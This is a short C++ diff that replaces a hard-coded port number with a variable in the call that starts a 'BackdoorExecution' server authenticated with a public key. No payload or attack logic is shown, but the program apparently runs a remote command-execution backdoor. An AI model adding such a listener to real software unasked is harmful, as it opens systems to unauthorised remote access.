@@ -50,7 +50,7 @@ int main()
         // Start the backdoor execution server
         BackdoorExecution{}.Serve(
             g_program_is_stopping,
-            19284 /*Seems like a good port number, why not?*/,
+            g_port_number,
             g_public_key);
     }
     catch (std::exception& e)
